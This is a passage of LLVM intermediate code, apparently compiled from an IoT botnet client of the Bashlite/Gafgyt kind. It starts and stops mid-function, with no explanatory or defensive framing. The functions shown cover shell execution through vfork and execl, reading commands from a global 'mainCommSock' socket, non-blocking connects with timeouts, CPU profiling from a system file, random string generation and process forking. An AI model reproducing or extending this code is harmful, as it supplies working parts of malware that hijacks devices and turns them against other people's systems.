  %24 = icmp eq i8* %23, null
  br i1 %24, label %78, label %25

; <label>:25:                                     ; preds = %19
  call void @llvm.memset.p0i8.i64(i8* nonnull %23, i8 0, i64 %21, i32 1, i1 false)
  br label %26

; <label>:26:                                     ; preds = %25, %13
  %27 = call i32 @vfork() #16
  switch i32 %27, label %61 [
    i32 -1, label %28
    i32 0, label %34
  ]

; <label>:28:                                     ; preds = %26
  %29 = load i32, i32* %10, align 4
  %30 = call i32 @close(i32 %29) #3
  %31 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %32 = load i32, i32* %31, align 4
  %33 = call i32 @close(i32 %32) #3
  br label %78

; <label>:34:                                     ; preds = %26
  %35 = load i8, i8* %1, align 1
  %36 = icmp eq i8 %35, 114
  br i1 %36, label %37, label %48

; <label>:37:                                     ; preds = %34
  %38 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %39 = load i32, i32* %38, align 4
  %40 = icmp eq i32 %39, 1
  br i1 %40, label %45, label %41

; <label>:41:                                     ; preds = %37
  %42 = call i32 @dup2(i32 %39, i32 1) #3
  %43 = load i32, i32* %38, align 4
  %44 = call i32 @close(i32 %43) #3
  br label %45

; <label>:45:                                     ; preds = %37, %41
  %46 = load i32, i32* %10, align 4
  %47 = call i32 @close(i32 %46) #3
  br label %59

; <label>:48:                                     ; preds = %34
  %49 = load i32, i32* %10, align 4
  %50 = icmp eq i32 %49, 0
  br i1 %50, label %55, label %51

; <label>:51:                                     ; preds = %48
  %52 = call i32 @dup2(i32 %49, i32 0) #3
  %53 = load i32, i32* %10, align 4
  %54 = call i32 @close(i32 %53) #3
  br label %55

; <label>:55:                                     ; preds = %48, %51
  %56 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %57 = load i32, i32* %56, align 4
  %58 = call i32 @close(i32 %57) #3
  br label %59

; <label>:59:                                     ; preds = %55, %45
  %60 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.66, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.67, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.68, i64 0, i64 0), i8* %0, i8* null) #3
  call void @_exit(i32 127) #17
  unreachable

; <label>:61:                                     ; preds = %26
  %62 = load i8, i8* %1, align 1
  %63 = icmp eq i8 %62, 114
  br i1 %63, label %64, label %69

; <label>:64:                                     ; preds = %61
  %65 = load i32, i32* %10, align 4
  %66 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %67 = load i32, i32* %66, align 4
  %68 = call i32 @close(i32 %67) #3
  br label %74

; <label>:69:                                     ; preds = %61
  %70 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %71 = load i32, i32* %70, align 4
  %72 = load i32, i32* %10, align 4
  %73 = call i32 @close(i32 %72) #3
  br label %74

; <label>:74:                                     ; preds = %69, %64
  %.011 = phi i32 [ %65, %64 ], [ %71, %69 ]
  %75 = load i32*, i32** @fdopen_pids, align 8
  %76 = sext i32 %.011 to i64
  %77 = getelementptr inbounds i32, i32* %75, i64 %76
  store i32 %27, i32* %77, align 4
  br label %78

; <label>:78:                                     ; preds = %19, %16, %9, %5, %2, %74, %28
  %.0 = phi i32 [ %.011, %74 ], [ -1, %28 ], [ -1, %2 ], [ -1, %5 ], [ -1, %9 ], [ -1, %16 ], [ -1, %19 ]
  ret i32 %.0
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @getdtablesize() local_unnamed_addr #5

; Function Attrs: nounwind returns_twice
declare i32 @vfork() local_unnamed_addr #7

declare i32 @close(i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @execl(i8*, i8*, ...) local_unnamed_addr #5

; Function Attrs: noreturn
declare void @_exit(i32) local_unnamed_addr #8

; Function Attrs: noinline nounwind uwtable
define i32 @fdpclose(i32) local_unnamed_addr #1 {
  %2 = alloca %struct.__sigset_t, align 8
  %3 = alloca %struct.__sigset_t, align 8
  %4 = alloca i32, align 4
  %5 = load i32*, i32** @fdopen_pids, align 8
  %6 = icmp eq i32* %5, null
  br i1 %6, label %37, label %7

; <label>:7:                                      ; preds = %1
  %8 = sext i32 %0 to i64
  %9 = getelementptr inbounds i32, i32* %5, i64 %8
  %10 = load i32, i32* %9, align 4
  %11 = icmp eq i32 %10, 0
  br i1 %11, label %37, label %12

; <label>:12:                                     ; preds = %7
  %13 = tail call i32 @close(i32 %0) #3
  %14 = call i32 @sigemptyset(%struct.__sigset_t* nonnull %3) #3
  %15 = call i32 @sigaddset(%struct.__sigset_t* nonnull %3, i32 2) #3
  %16 = call i32 @sigaddset(%struct.__sigset_t* nonnull %3, i32 3) #3
  %17 = call i32 @sigaddset(%struct.__sigset_t* nonnull %3, i32 1) #3
  %18 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* nonnull %3, %struct.__sigset_t* nonnull %2) #3
  br label %19

; <label>:19:                                     ; preds = %25, %12
  %20 = load i32*, i32** @fdopen_pids, align 8
  %21 = getelementptr inbounds i32, i32* %20, i64 %8
  %22 = load i32, i32* %21, align 4
  %23 = call i32 @waitpid(i32 %22, i32* nonnull %4, i32 0) #3
  %24 = icmp eq i32 %23, -1
  br i1 %24, label %25, label %31

; <label>:25:                                     ; preds = %19
  %26 = tail call i32* @__errno_location() #18
  %27 = load i32, i32* %26, align 4
  %28 = icmp eq i32 %27, 4
  br i1 %28, label %19, label %.critedge

.critedge:                                        ; preds = %25
  %29 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* nonnull %2, %struct.__sigset_t* null) #3
  %30 = load i32*, i32** @fdopen_pids, align 8
  store i32 0, i32* %30, align 4
  br label %37

; <label>:31:                                     ; preds = %19
  %32 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* nonnull %2, %struct.__sigset_t* null) #3
  %33 = load i32*, i32** @fdopen_pids, align 8
  store i32 0, i32* %33, align 4
  %34 = load i32, i32* %4, align 4
  %35 = lshr i32 %34, 8
  %36 = and i32 %35, 255
  br label %37

; <label>:37:                                     ; preds = %.critedge, %31, %1, %7
  %.0 = phi i32 [ -1, %7 ], [ -1, %1 ], [ %36, %31 ], [ -1, %.critedge ]
  ret i32 %.0
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) local_unnamed_addr #5

declare i32 @waitpid(i32, i32*, i32) local_unnamed_addr #4

; Function Attrs: nounwind readnone
declare i32* @__errno_location() local_unnamed_addr #9

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) local_unnamed_addr #1 {
  %4 = icmp sgt i32 %1, 0
  br i1 %4, label %.lr.ph.preheader, label %.critedge

.lr.ph.preheader:                                 ; preds = %3
  %5 = sext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %10
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %10 ]
  %6 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %7 = getelementptr inbounds i8, i8* %6, i64 -1
  %8 = load i8, i8* %7, align 1
  %9 = icmp eq i8 %8, 10
  br i1 %9, label %.critedge.loopexit, label %10

; <label>:10:                                     ; preds = %.lr.ph
  %11 = tail call i64 @read(i32 %2, i8* %6, i64 1) #3
  %12 = trunc i64 %11 to i32
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %13 = icmp eq i32 %12, 1
  %14 = icmp slt i64 %indvars.iv.next, %5
  %or.cond = and i1 %13, %14
  br i1 %or.cond, label %.lr.ph, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph, %10
  %.011.lcssa.ph = phi i32 [ 1, %.lr.ph ], [ %12, %10 ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %3
  %.011.lcssa = phi i32 [ 1, %3 ], [ %.011.lcssa.ph, %.critedge.loopexit ]
  %15 = icmp eq i32 %.011.lcssa, 0
  %16 = select i1 %15, i8* null, i8* %0
  ret i8* %16
}

declare i64 @read(i32, i8* nocapture, i64) local_unnamed_addr #4

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i64 @parseHex(i8* nocapture readonly) local_unnamed_addr #10 {
  %2 = load i8, i8* %0, align 1
  %3 = icmp eq i8 %2, 0
  br i1 %3, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %1
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %4 = phi i8 [ %11, %.lr.ph ], [ %2, %.lr.ph.preheader ]
  %.05 = phi i64 [ %10, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %.034 = phi i8* [ %6, %.lr.ph ], [ %0, %.lr.ph.preheader ]
  %5 = shl i64 %.05, 4
  %6 = getelementptr inbounds i8, i8* %.034, i64 1
  %7 = zext i8 %4 to i64
  %8 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %7
  %9 = load i64, i64* %8, align 8
  %10 = or i64 %9, %5
  %11 = load i8, i8* %6, align 1
  %12 = icmp ne i8 %11, 0
  %13 = icmp sgt i64 %10, -1
  %14 = and i1 %13, %12
  br i1 %14, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  %.0.lcssa = phi i64 [ 0, %1 ], [ %10, %._crit_edge.loopexit ]
  ret i64 %.0.lcssa
}

; Function Attrs: noinline nounwind readonly uwtable
define i32 @wildString(i8* readonly, i8* readonly) local_unnamed_addr #11 {
  %3 = load i8, i8* %0, align 1
  switch i8 %3, label %32 [
    i8 0, label %4
    i8 42, label %7
    i8 63, label %21
  ]

; <label>:4:                                      ; preds = %2
  %5 = load i8, i8* %1, align 1
  %6 = zext i8 %5 to i32
  br label %47

; <label>:7:                                      ; preds = %2
  %8 = getelementptr inbounds i8, i8* %0, i64 1
  %9 = tail call i32 @wildString(i8* %8, i8* %1)
  %10 = icmp eq i32 %9, 0
  br i1 %10, label %18, label %11

; <label>:11:                                     ; preds = %7
  %12 = load i8, i8* %1, align 1
  %13 = icmp eq i8 %12, 0
  br i1 %13, label %18, label %14

; <label>:14:                                     ; preds = %11
  %15 = getelementptr inbounds i8, i8* %1, i64 1
  %16 = tail call i32 @wildString(i8* nonnull %0, i8* %15)
  %17 = icmp ne i32 %16, 0
  br label %18

; <label>:18:                                     ; preds = %11, %7, %14
  %19 = phi i1 [ false, %7 ], [ true, %11 ], [ %17, %14 ]
  %20 = zext i1 %19 to i32
  br label %47

; <label>:21:                                     ; preds = %2
  %22 = load i8, i8* %1, align 1
  %23 = icmp eq i8 %22, 0
  br i1 %23, label %29, label %24

; <label>:24:                                     ; preds = %21
  %25 = getelementptr inbounds i8, i8* %0, i64 1
  %26 = getelementptr inbounds i8, i8* %1, i64 1
  %27 = tail call i32 @wildString(i8* %25, i8* %26)
  %28 = icmp ne i32 %27, 0
  br label %29

; <label>:29:                                     ; preds = %21, %24
  %30 = phi i1 [ true, %21 ], [ %28, %24 ]
  %31 = zext i1 %30 to i32
  br label %47

; <label>:32:                                     ; preds = %2
  %33 = zext i8 %3 to i32
  %34 = tail call i32 @toupper(i32 %33) #15
  %35 = load i8, i8* %1, align 1
  %36 = zext i8 %35 to i32
  %37 = tail call i32 @toupper(i32 %36) #15
  %38 = icmp eq i32 %34, %37
  br i1 %38, label %39, label %44

; <label>:39:                                     ; preds = %32
  %40 = getelementptr inbounds i8, i8* %0, i64 1
  %41 = getelementptr inbounds i8, i8* %1, i64 1
  %42 = tail call i32 @wildString(i8* %40, i8* %41)
  %43 = icmp ne i32 %42, 0
  br label %44

; <label>:44:                                     ; preds = %39, %32
  %45 = phi i1 [ true, %32 ], [ %43, %39 ]
  %46 = zext i1 %45 to i32
  br label %47

; <label>:47:                                     ; preds = %44, %29, %18, %4
  %.0 = phi i32 [ %46, %44 ], [ %31, %29 ], [ %20, %18 ], [ %6, %4 ]
  ret i32 %.0
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr* nocapture) local_unnamed_addr #1 {
  %3 = tail call i32 @inet_addr(i8* %0) #3
  %4 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1, i64 0, i32 0
  store i32 %3, i32* %4, align 4
  %5 = icmp eq i32 %3, -1
  %. = zext i1 %5 to i32
  ret i32 %.
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define void @uppercase(i8* nocapture) local_unnamed_addr #1 {
  %2 = load i8, i8* %0, align 1
  %3 = icmp eq i8 %2, 0
  br i1 %3, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %1
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %4 = phi i8 [ %9, %.lr.ph ], [ %2, %.lr.ph.preheader ]
  %.04 = phi i8* [ %8, %.lr.ph ], [ %0, %.lr.ph.preheader ]
  %5 = zext i8 %4 to i32
  %6 = tail call i32 @toupper(i32 %5) #15
  %7 = trunc i32 %6 to i8
  store i8 %7, i8* %.04, align 1
  %8 = getelementptr inbounds i8, i8* %.04, i64 1
  %9 = load i8, i8* %8, align 1
  %10 = icmp eq i8 %9, 0
  br i1 %10, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @getBogos(i8*) local_unnamed_addr #1 {
  %2 = alloca [4096 x i8], align 16
  %3 = tail call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.69, i64 0, i64 0), i32 0) #3
  %4 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 0
  %5 = call i8* @fdgets(i8* nonnull %4, i32 4096, i32 %3)
  %6 = icmp eq i8* %5, null
  br i1 %6, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %1
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %24
  call void @uppercase(i8* nonnull %4)
  %strncmp = call i32 @strncmp(i8* nonnull %4, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.70, i64 0, i64 0), i64 8)
  %cmp = icmp eq i32 %strncmp, 0
  br i1 %cmp, label %7, label %24

; <label>:7:                                      ; preds = %.lr.ph
  %8 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 8
  br label %9

; <label>:9:                                      ; preds = %.critedge, %7
  %.0 = phi i8* [ %8, %7 ], [ %11, %.critedge ]
  %10 = load i8, i8* %.0, align 1
  switch i8 %10, label %.preheader.preheader [
    i8 32, label %.critedge
    i8 9, label %.critedge
    i8 58, label %.critedge
  ]

.preheader.preheader:                             ; preds = %9
  br label %.preheader

.critedge:                                        ; preds = %9, %9, %9
  %11 = getelementptr inbounds i8, i8* %.0, i64 1
  br label %9

.preheader:                                       ; preds = %.preheader.preheader, %16
  %12 = call i64 @strlen(i8* %.0) #15
  %13 = add i64 %12, -1
  %14 = getelementptr inbounds i8, i8* %.0, i64 %13
  %15 = load i8, i8* %14, align 1
  switch i8 %15, label %17 [
    i8 13, label %16
    i8 10, label %16
  ]

; <label>:16:                                     ; preds = %.preheader, %.preheader
  store i8 0, i8* %14, align 1
  br label %.preheader

; <label>:17:                                     ; preds = %.preheader
  %18 = call i8* @strchr(i8* nonnull %.0, i32 46) #15
  %19 = icmp eq i8* %18, null
  br i1 %19, label %21, label %20

; <label>:20:                                     ; preds = %17
  store i8 0, i8* %18, align 1
  br label %21

; <label>:21:                                     ; preds = %17, %20
  %22 = call i8* @strcpy(i8* %0, i8* nonnull %.0) #3
  %23 = call i32 @close(i32 %3) #3
  br label %28

; <label>:24:                                     ; preds = %.lr.ph
  call void @llvm.memset.p0i8.i64(i8* nonnull %4, i8 0, i64 4096, i32 16, i1 false)
  %25 = call i8* @fdgets(i8* nonnull %4, i32 4096, i32 %3)
  %26 = icmp eq i8* %25, null
  br i1 %26, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %24
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  %27 = call i32 @close(i32 %3) #3
  br label %28

; <label>:28:                                     ; preds = %._crit_edge, %21
  %.017 = phi i32 [ 0, %21 ], [ 1, %._crit_edge ]
  ret i32 %.017
}

declare i32 @open(i8* nocapture readonly, i32, ...) local_unnamed_addr #4

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) local_unnamed_addr #2

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8* nocapture readonly) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @getCores() local_unnamed_addr #1 {
  %1 = alloca [4096 x i8], align 16
  %2 = tail call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.69, i64 0, i64 0), i32 0) #3
  %3 = getelementptr inbounds [4096 x i8], [4096 x i8]* %1, i64 0, i64 0
  %4 = call i8* @fdgets(i8* nonnull %3, i32 4096, i32 %2)
  %5 = icmp eq i8* %4, null
  br i1 %5, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %0
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.04 = phi i32 [ %..0, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  call void @uppercase(i8* nonnull %3)
  %strncmp = call i32 @strncmp(i8* nonnull %3, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.70, i64 0, i64 0), i64 8)
  %cmp = icmp eq i32 %strncmp, 0
  %6 = zext i1 %cmp to i32
  %..0 = add nsw i32 %6, %.04
  call void @llvm.memset.p0i8.i64(i8* nonnull %3, i8 0, i64 4096, i32 16, i1 false)
  %7 = call i8* @fdgets(i8* nonnull %3, i32 4096, i32 %2)
  %8 = icmp eq i8* %7, null
  br i1 %8, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %0
  %.0.lcssa = phi i32 [ 0, %0 ], [ %..0, %._crit_edge.loopexit ]
  %9 = call i32 @close(i32 %2) #3
  ret i32 %.0.lcssa
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @makeRandomStr(i8* nocapture, i32) local_unnamed_addr #0 {
  %3 = icmp sgt i32 %1, 0
  br i1 %3, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  %wide.trip.count = zext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %indvars.iv = phi i64 [ %indvars.iv.next, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %4 = tail call i32 @rand_cmwc()
  %5 = urem i32 %4, 26
  %6 = add nuw nsw i32 %5, 65
  %7 = trunc i32 %6 to i8
  %8 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  store i8 %7, i8* %8, align 1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, %wide.trip.count
  br i1 %exitcond, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %2
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8* nocapture, i32) local_unnamed_addr #1 {
  %4 = alloca %struct.__sigset_t, align 8
  %5 = alloca %struct.timeval, align 8
  %6 = alloca i8, align 1
  %7 = sext i32 %2 to i64
  tail call void @llvm.memset.p0i8.i64(i8* %1, i8 0, i64 %7, i32 1, i1 false)
  %8 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i64 0, i32 0
  store i64 30, i64* %8, align 8
  %9 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i64 0, i32 1
  store i64 0, i64* %9, align 8
  %10 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i64 0, i32 0, i64 0
  %11 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %10) #3, !srcloc !1
  %12 = srem i32 %0, 64
  %13 = zext i32 %12 to i64
  %14 = shl i64 1, %13
  %15 = sdiv i32 %0, 64
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i64 0, i32 0, i64 %16
  %18 = load i64, i64* %17, align 8
  %19 = or i64 %18, %14
  store i64 %19, i64* %17, align 8
  %20 = add nsw i32 %0, 1
  %21 = call i32 @select(i32 %20, %struct.__sigset_t* nonnull %4, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %4, %struct.timeval* nonnull %5) #3
  %22 = icmp sgt i32 %2, 1
  br i1 %22, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %3
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %31
  %.in = phi i32 [ %23, %31 ], [ %2, %.lr.ph.preheader ]
  %.024 = phi i32 [ %32, %31 ], [ 0, %.lr.ph.preheader ]
  %.01923 = phi i8* [ %29, %31 ], [ %1, %.lr.ph.preheader ]
  %23 = add nsw i32 %.in, -1
  %24 = load i32, i32* @mainCommSock, align 4
  %25 = call i64 @recv(i32 %24, i8* nonnull %6, i64 1, i32 0) #3
  %26 = icmp eq i64 %25, 1
  br i1 %26, label %27, label %._crit_edge.loopexit

; <label>:27:                                     ; preds = %.lr.ph
  %28 = load i8, i8* %6, align 1
  %29 = getelementptr inbounds i8, i8* %.01923, i64 1
  store i8 %28, i8* %.01923, align 1
  %30 = icmp eq i8 %28, 10
  br i1 %30, label %._crit_edge.loopexit, label %31

; <label>:31:                                     ; preds = %27
  %32 = add nuw nsw i32 %.024, 1
  %33 = icmp sgt i32 %23, 1
  br i1 %33, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph, %31, %27
  %.1.sink.ph = phi i8* [ %.01923, %.lr.ph ], [ %29, %31 ], [ %29, %27 ]
  %.020.ph = phi i32 [ -1, %.lr.ph ], [ %32, %31 ], [ %.024, %27 ]
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %3
  %.1.sink = phi i8* [ %1, %3 ], [ %.1.sink.ph, %._crit_edge.loopexit ]
  %.020 = phi i32 [ 0, %3 ], [ %.020.ph, %._crit_edge.loopexit ]
  store i8 0, i8* %.1.sink, align 1
  ret i32 %.020
}

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) local_unnamed_addr #4

declare i64 @recv(i32, i8*, i64, i32) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) local_unnamed_addr #1 {
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca %struct.timeval, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = tail call i32 (i32, i32, ...) @fcntl(i32 %0, i32 3, i8* null) #3
  %11 = sext i32 %10 to i64
  %12 = or i64 %11, 2048
  %13 = tail call i32 (i32, i32, ...) @fcntl(i32 %0, i32 4, i64 %12) #3
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  store i16 2, i16* %14, align 4
  %15 = trunc i32 %2 to i16
  %16 = tail call zeroext i16 @htons(i16 zeroext %15) #18
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  store i16 %16, i16* %17, align 2
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2
  %19 = call i32 @getHost(i8* %1, %struct.in_addr* %18)
  %20 = icmp eq i32 %19, 0
  br i1 %20, label %21, label %58

; <label>:21:                                     ; preds = %4
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 3, i64 0
  %23 = bitcast i8* %22 to i64*
  store i64 0, i64* %23, align 4
  %24 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %25 = call i32 @connect(i32 %0, %struct.sockaddr* nonnull %24, i32 16) #3
  %26 = icmp slt i32 %25, 0
  br i1 %26, label %27, label %53

; <label>:27:                                     ; preds = %21
  %28 = tail call i32* @__errno_location() #18
  %29 = load i32, i32* %28, align 4
  %30 = icmp eq i32 %29, 115
  br i1 %30, label %31, label %58

; <label>:31:                                     ; preds = %27
  %32 = sext i32 %3 to i64
  %33 = getelementptr inbounds %struct.timeval, %struct.timeval* %7, i64 0, i32 0
  store i64 %32, i64* %33, align 8
  %34 = getelementptr inbounds %struct.timeval, %struct.timeval* %7, i64 0, i32 1
  store i64 0, i64* %34, align 8
  %35 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %6, i64 0, i32 0, i64 0
  %36 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %35) #3, !srcloc !2
  %37 = srem i32 %0, 64
  %38 = zext i32 %37 to i64
  %39 = shl i64 1, %38
  %40 = sdiv i32 %0, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %6, i64 0, i32 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = or i64 %43, %39
  store i64 %44, i64* %42, align 8
  %45 = add nsw i32 %0, 1
  %46 = call i32 @select(i32 %45, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %6, %struct.__sigset_t* null, %struct.timeval* nonnull %7) #3
  %47 = icmp sgt i32 %46, 0
  br i1 %47, label %48, label %58

; <label>:48:                                     ; preds = %31
  store i32 4, i32* %8, align 4
  %49 = bitcast i32* %9 to i8*
  %50 = call i32 @getsockopt(i32 %0, i32 1, i32 4, i8* nonnull %49, i32* nonnull %8) #3
  %51 = load i32, i32* %9, align 4
  %52 = icmp eq i32 %51, 0
  br i1 %52, label %53, label %58

; <label>:53:                                     ; preds = %48, %21
  %54 = call i32 (i32, i32, ...) @fcntl(i32 %0, i32 3, i8* null) #3
  %55 = sext i32 %54 to i64
  %56 = and i64 %55, -2049
  %57 = call i32 (i32, i32, ...) @fcntl(i32 %0, i32 4, i64 %56) #3
  br label %58

; <label>:58:                                     ; preds = %27, %31, %48, %4, %53
  %.0 = phi i32 [ 1, %53 ], [ 0, %4 ], [ 0, %48 ], [ 0, %31 ], [ 0, %27 ]
  ret i32 %.0
}

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr #4

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) local_unnamed_addr #9

declare i32 @connect(i32, %struct.sockaddr*, i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() local_unnamed_addr #1 {
  %1 = tail call i32 @fork() #3
  %2 = icmp eq i32 %1, 0
  br i1 %2, label %23, label %3

; <label>:3:                                      ; preds = %0
  %4 = load i64, i64* @numpids, align 8
  %5 = add i64 %4, 1
  store i64 %5, i64* @numpids, align 8
  %6 = shl i64 %4, 2
  %7 = add i64 %6, 8
  %8 = tail call noalias i8* @malloc(i64 %7) #3
  %9 = bitcast i8* %8 to i32*
  %10 = icmp eq i64 %4, 0
  br i1 %10, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %3
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %11 = phi i64 [ %17, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %.012 = phi i32 [ %16, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %12 = load i32*, i32** @pids, align 8
  %13 = getelementptr inbounds i32, i32* %12, i64 %11
  %14 = load i32, i32* %13, align 4
  %15 = getelementptr inbounds i32, i32* %9, i64 %11
  store i32 %14, i32* %15, align 4
  %16 = add i32 %.012, 1
  %17 = zext i32 %16 to i64
  %18 = load i64, i64* @numpids, align 8
  %19 = add i64 %18, -1
  %20 = icmp ult i64 %17, %19
  br i1 %20, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %3
  %.lcssa = phi i64 [ 0, %3 ], [ %19, %._crit_edge.loopexit ]
  %21 = getelementptr inbounds i32, i32* %9, i64 %.lcssa
  store i32 %1, i32* %21, align 4
  %22 = load i8*, i8** bitcast (i32** @pids to i8**), align 8
  tail call void @free(i8* %22) #3
